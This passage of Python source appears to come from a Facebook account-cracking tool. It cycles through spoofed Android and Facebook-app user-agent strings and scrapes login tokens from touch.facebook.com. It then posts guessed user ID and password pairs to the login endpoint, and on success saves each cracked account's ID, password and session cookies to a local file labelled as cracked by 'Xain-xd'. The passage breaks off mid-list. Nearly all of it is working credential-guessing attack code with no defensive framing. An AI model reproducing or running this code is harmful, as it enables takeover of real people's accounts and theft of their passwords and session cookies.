            uai = random.choice(["Mozilla/5.0 (Linux; Android 10; Z30 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/373.1.0.8.104;]","Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/373.1.0.8.104;]","Mozilla/5.0 (Linux; Android 10; Z30 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/373.1.0.8.104;]","Mozilla/5.0 (Linux; Android 11; TECNO BE6j Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/244.0.0.6.117;]","Mozilla/5.0 (Linux; Android 12; ZTE Blade L220 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/373.1.0.8.104;]","Mozilla/5.0 (Linux; Android 11; BUZZ 3 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36[FBAN/EMA;FBLC/ar_AR;FBAV/364.0.0.14.77;]","Mozilla/5.0 (Linux; Android 11; TECNO BE6j Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/244.0.0.6.117;]","Mozilla/5.0 (Linux; Android 11; TECNO BE6j Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/373.1.0.8.104;]","Mozilla/5.0 (Linux; Android 11; TECNO BE6 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102;]","Mozilla/5.0 (Linux; Android 11; TECNO BE6j Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]","Mozilla/5.0 (Linux; Android 11; TECNO BE6j Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/372.0.0.15.104;]","Mozilla/5.0 (Linux; Android 12; ZTE Blade L220 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/371.0.0.10.104;]","Mozilla/5.0 (Linux; Android 12; ZTE Blade L220 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/373.1.0.8.104;]","Mozilla/5.0 (Linux; Android 12; ZTE Blade L220 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; ZTE Blade L220 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]","Mozilla/5.0 (Linux; Android 10; Z30 pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 10; Primo HM6 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/bn_IN;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 13; Nokia C32 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 11; AE9950 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/bn_IN;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 10; itel A14 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/363.0.0.6.63;]","Mozilla/5.0 (Linux; Android 12; itel S663L Build/SP1A.210812.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/374.0.0.10.114;]","Mozilla/5.0 (Linux; Android 12; itel S663L Build/SP1A.210812.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/375.0.0.7.111;]","Mozilla/5.0 (Linux; Android 10; Symphony Atom ii Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 11; F10XIPSQ Build/0929; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 12; Sparx Neo 7 Pro Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/368.0.0.5.95;]","Mozilla/5.0 (Linux; Android 8.1.0; C11_Pro Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 8.1.0; itel W6001 Build/OPM2.171019.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/370.0.0.16.116;]","Mozilla/5.0 (Linux; Android 8.1.0; BUZZ 1 Plus Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36[FBAN/EMA;FBLC/ar_AR;FBAV/367.0.0.7.52;]","Mozilla/5.0 (Linux; Android 9; LH9920 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/ta_IN;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 9.0; X109 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/376.0.0.7.103;]"])
            uai2 = random.choice(["Mozilla/5.0 (Linux; Android 10; Z30 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/373.1.0.8.104;]","Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/373.1.0.8.104;]","Mozilla/5.0 (Linux; Android 10; Z30 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/373.1.0.8.104;]","Mozilla/5.0 (Linux; Android 11; TECNO BE6j Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/244.0.0.6.117;]","Mozilla/5.0 (Linux; Android 12; ZTE Blade L220 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/373.1.0.8.104;]","Mozilla/5.0 (Linux; Android 11; BUZZ 3 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36[FBAN/EMA;FBLC/ar_AR;FBAV/364.0.0.14.77;]","Mozilla/5.0 (Linux; Android 11; TECNO BE6j Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/244.0.0.6.117;]","Mozilla/5.0 (Linux; Android 11; TECNO BE6j Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/373.1.0.8.104;]","Mozilla/5.0 (Linux; Android 11; TECNO BE6 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102;]","Mozilla/5.0 (Linux; Android 11; TECNO BE6j Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]","Mozilla/5.0 (Linux; Android 11; TECNO BE6j Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/372.0.0.15.104;]","Mozilla/5.0 (Linux; Android 12; ZTE Blade L220 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/371.0.0.10.104;]","Mozilla/5.0 (Linux; Android 12; ZTE Blade L220 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/373.1.0.8.104;]","Mozilla/5.0 (Linux; Android 12; ZTE Blade L220 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; ZTE Blade L220 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]","Mozilla/5.0 (Linux; Android 10; Z30 pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 10; Primo HM6 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/bn_IN;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 13; Nokia C32 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 11; AE9950 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/bn_IN;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 10; itel A14 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/363.0.0.6.63;]","Mozilla/5.0 (Linux; Android 12; itel S663L Build/SP1A.210812.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/374.0.0.10.114;]","Mozilla/5.0 (Linux; Android 12; itel S663L Build/SP1A.210812.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/375.0.0.7.111;]","Mozilla/5.0 (Linux; Android 10; Symphony Atom ii Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 11; F10XIPSQ Build/0929; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 12; Sparx Neo 7 Pro Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/368.0.0.5.95;]","Mozilla/5.0 (Linux; Android 8.1.0; C11_Pro Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 8.1.0; itel W6001 Build/OPM2.171019.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/370.0.0.16.116;]","Mozilla/5.0 (Linux; Android 8.1.0; BUZZ 1 Plus Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36[FBAN/EMA;FBLC/ar_AR;FBAV/367.0.0.7.52;]","Mozilla/5.0 (Linux; Android 9; LH9920 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/ta_IN;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 9.0; X109 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/376.0.0.7.103;]"])
            session.headers.update({"Host": "m.facebook.com","upgrade-insecure-requests":"1","user-agent":f"{uai}","accept":"*/*","dnt":"1","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":f"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-US,en;q=0.9"})
            get_method = session.get(f"https://touch.facebook.com/").text
            date = {'lsd': re.search('name="lsd" value="(.*?)"',str(get_method)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(get_method)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(get_method)).group(1), 'li': re.search('name="li" value="(.*?)"',str(get_method)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': uid, 'pass': ps, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(get_method)).group(1)}
            head = ({"Host": "m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com/","content-type":"application/x-www-form-urlencoded","user-agent":f"{uai2}","accept":"*/*","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"?1","sec-fetch-dest":"empty","referer":f"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-US,en;q=0.9"})
            post_method = session.post(f"https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data=date, headers=head)
            if "c_user" in session.cookies.get_dict():
                kukis=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xx=kukis.split("c_user=")[1]
                uid=xx[:15].replace(";","  ")
              #  ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
                #res = requests.get(ckk).text
               # if 'Photoshop' in res:
                oks.append(uid)
                print(f"\r\r[b]"+xain_co(oks)+f" [bright_green]{uid} [orange3]▶ [bright_green]{ps}               \n{animi(oks)}sb=cracked_by.Xain-xd:tool;"+kukis.replace("-1","1")+"\n")
                open("/sdcard/XAIN XD/XAIN-OK.txt","a").write(uid+"|"+ps+"|"+kukis+"\n")
                break            
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1    


def renmeth3(uid,pwx,tl,qw):
    global oks,loop,cpc
    sys.stdout.write(f'\r  \033[1;37m{spin_ani(loop)}\033[38;5;93m[{savage_animi(loop)}\033[38;5;93m]~\033[1;37m[\033[1;30mM\033[1;30m{qw}\033[1;37m]~\033[38;5;93m[\033[1;1m{animation_lop_lt(loop,tl)}\033[1;00m\033[38;5;93m]~[\033[1;37m\033[1;1m\033[1;32m{str(len(oks))}\033[1;00m\033[38;5;93m]\033[0;00m\r');sys.stdout.flush()        
    for ps in pwx:
        try:
            session=requests.session()            
            uai = random.choice(["Mozilla/5.0 (Linux; Android 10; Z30 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/373.1.0.8.104;]","Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/373.1.0.8.104;]","Mozilla/5.0 (Linux; Android 10; Z30 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/373.1.0.8.104;]","Mozilla/5.0 (Linux; Android 11; TECNO BE6j Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/244.0.0.6.117;]","Mozilla/5.0 (Linux; Android 12; ZTE Blade L220 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/373.1.0.8.104;]","Mozilla/5.0 (Linux; Android 11; BUZZ 3 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36[FBAN/EMA;FBLC/ar_AR;FBAV/364.0.0.14.77;]","Mozilla/5.0 (Linux; Android 11; TECNO BE6j Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/244.0.0.6.117;]","Mozilla/5.0 (Linux; Android 11; TECNO BE6j Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/373.1.0.8.104;]","Mozilla/5.0 (Linux; Android 11; TECNO BE6 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102;]","Mozilla/5.0 (Linux; Android 11; TECNO BE6j Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]","Mozilla/5.0 (Linux; Android 11; TECNO BE6j Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/372.0.0.15.104;]","Mozilla/5.0 (Linux; Android 12; ZTE Blade L220 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/371.0.0.10.104;]","Mozilla/5.0 (Linux; Android 12; ZTE Blade L220 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/373.1.0.8.104;]","Mozilla/5.0 (Linux; Android 12; ZTE Blade L220 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; ZTE Blade L220 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]","Mozilla/5.0 (Linux; Android 10; Z30 pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 10; Primo HM6 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/bn_IN;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 13; Nokia C32 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 11; AE9950 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/bn_IN;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 10; itel A14 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/363.0.0.6.63;]","Mozilla/5.0 (Linux; Android 12; itel S663L Build/SP1A.210812.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/374.0.0.10.114;]","Mozilla/5.0 (Linux; Android 12; itel S663L Build/SP1A.210812.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/375.0.0.7.111;]","Mozilla/5.0 (Linux; Android 10; Symphony Atom ii Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 11; F10XIPSQ Build/0929; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 12; Sparx Neo 7 Pro Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/368.0.0.5.95;]","Mozilla/5.0 (Linux; Android 8.1.0; C11_Pro Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 8.1.0; itel W6001 Build/OPM2.171019.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/370.0.0.16.116;]","Mozilla/5.0 (Linux; Android 8.1.0; BUZZ 1 Plus Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36[FBAN/EMA;FBLC/ar_AR;FBAV/367.0.0.7.52;]","Mozilla/5.0 (Linux; Android 9; LH9920 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/ta_IN;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 9.0; X109 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/376.0.0.7.103;]"])
            uai2 = random.choice(["Mozilla/5.0 (Linux; Android 10; Z30 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/373.1.0.8.104;]","Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/373.1.0.8.104;]","Mozilla/5.0 (Linux; Android 10; Z30 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/373.1.0.8.104;]","Mozilla/5.0 (Linux; Android 11; TECNO BE6j Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/244.0.0.6.117;]","Mozilla/5.0 (Linux; Android 12; ZTE Blade L220 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/373.1.0.8.104;]","Mozilla/5.0 (Linux; Android 11; BUZZ 3 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36[FBAN/EMA;FBLC/ar_AR;FBAV/364.0.0.14.77;]","Mozilla/5.0 (Linux; Android 11; TECNO BE6j Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/244.0.0.6.117;]","Mozilla/5.0 (Linux; Android 11; TECNO BE6j Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/373.1.0.8.104;]","Mozilla/5.0 (Linux; Android 11; TECNO BE6 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102;]","Mozilla/5.0 (Linux; Android 11; TECNO BE6j Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]","Mozilla/5.0 (Linux; Android 11; TECNO BE6j Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/372.0.0.15.104;]","Mozilla/5.0 (Linux; Android 12; 